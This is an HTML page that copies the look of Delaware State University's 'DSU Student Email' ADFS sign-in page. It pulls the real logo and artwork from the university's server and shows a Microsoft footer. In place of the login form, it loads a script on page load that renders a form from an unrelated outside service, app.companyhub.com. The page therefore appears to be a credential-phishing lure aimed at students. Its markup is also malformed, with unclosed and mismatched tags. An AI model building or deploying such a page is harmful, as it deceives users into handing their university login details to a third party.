<!doctype html>
<html lang="en-US">
<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1" />
  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
  <meta http-equiv="cache-control" content="no-cache,no-store" />
  <meta http-equiv="pragma" content="no-cache" />
  <meta http-equiv="expires" content="-1" />
  <meta name="mswebdialog-title" content="Connecting to DSU Student Email" />

  <title>DSU Student Email</title>

  <style>
    :root{
      --bg: #f5f7fb;
      --panel: #ffffff;
      --text: #1a1a1a;
      --muted: #5b6472;
      --border: #e6e9ef;
      --accent: #2f92d4;
    }

    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    /* Layout wrapper similar to the original structure */
    #fullPage {
      min-height: 100vh;
      display: flex;
      align-items: stretch;
    }

    /* Left branding/illustration column */
    #brandingWrapper {
      flex: 1 1 45%;
      min-height: 100vh;
      display: none; /* hidden on small screens; shown via media query */
      background-color: #0f2a3a;
      position: relative;
      overflow: hidden;
    }

    #branding {
      position: absolute;
      inset: 0;
      background-image: url("https://fs.desu.edu/adfs/portal/illustration/illustration.png?id=183128A3C941EDE3D9199FA37D6AA90E0A7DFE101B37D10B4FEDA0CF35E11AFD");
      background-repeat: no-repeat;
      background-position: center center;
      background-size: cover;
      filter: saturate(1.05);
      transform: scale(1.02);
    }

    /* Right content column */
    #contentWrapper {
      flex: 1 1 55%;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      background: var(--panel);
      border-left: 1px solid var(--border);
    }

    #content {
      padding: 48px 42px 24px;
      max-width: 560px;
      width: 100%;
      margin: 0 auto;
    }

    #header {
      display: flex;
      align-items: center;
      gap: 14px;
      margin-bottom: 26px;
    }

    .logoImage {
      max-height: 54px;
      height: auto;
      width: auto;
      display: block;
    }

    main {
      display: block;
    }

    #workArea {
      padding-top: 8px;
    }

    #loginMessage {
      font-size: 22px;
      font-weight: 650;
      margin: 8px 0 10px;
      letter-spacing: 0.2px;
    }

    .subtext {
      margin: 0 0 22px;
      color: var(--muted);
      line-height: 1.45;
    }

    /* Static “card” area to replace the login form */
    .staticCard {
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 18px 18px;
      background: #fff;
      box-shadow: 0 4px 18px rgba(20, 30, 55, 0.06);
    }

    .staticCard h2{
      font-size: 15px;
      margin: 0 0 8px;
      font-weight: 650;
    }

    .staticCard p{
      margin: 0;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.5;
    }

    #introduction {
      margin-top: 18px;
      color: var(--muted);
      font-size: 14px;
    }

    #introduction a {
      color: var(--accent);
      text-decoration: none;
    }

    #introduction a:hover {
      text-decoration: underline;
    }

    /* Footer */
    #footer {
      border-top: 1px solid var(--border);
      padding: 16px 42px;
      background: #fff;
    }

    #footerLinks {
      max-width: 560px;
      margin: 0 auto;
      display: flex;
      justify-content: flex-end;
      color: var(--muted);
      font-size: 13px;
    }

    /* Responsive behavior similar to typical ADFS pages */
    @media (min-width: 960px) {
      #brandingWrapper { display: block; }
    }

    @media (max-width: 520px) {
      #content { padding: 34px 18px 18px; }
      #footer  { padding: 14px 18px; }
    }
  </style>
</head>

<body dir="ltr">
  <div id="fullPage">
    <!-- Left illustration / background -->
    <div id="brandingWrapper" aria-hidden="true">
      <div id="branding"></div>
    </div>

    <!-- Right content -->
    <div id="contentWrapper">
      <div id="content">
        <div id="header">
          <img
            class="logoImage"
            id="companyLogo"
            src="https://fs.desu.edu/adfs/portal/logo/logo.jpg?id=A1EA6F85CA9F61396D15AA98E0AB626C43ACDCC05EAEB0F4C4A0DC765204E722"
            alt="DSU Student Email"
          />
        </div>

        <script src="https://app.companyhub.com/scripts/companyhub.forms.js"></script><script>companyhubForms.render("https://app.companyhub.com/webtolead/renderform/Mjc1MDU1?name=Contact_Form", "companyhub-form");</script>
<div id="companyhub-form" style="height: 400%; width: 100%;">

         

              <div id="introduction" class="groupMargin">
                <p>
                  To change your password, click
                  <a href="https://fs.desu.edu/adfs/portal/updatepassword" rel="noopener noreferrer">
                    here
                  </a>.
                </p>
              </div>
            </div>
          </div>
        </main>
      </div>

      <footer id="footer">
        <div id="footerLinks">
          <div><span id="copyright">© 2018 Microsoft</span></div>
        </div>
      </footer>
    </div>
  </div>
</body>

</html>
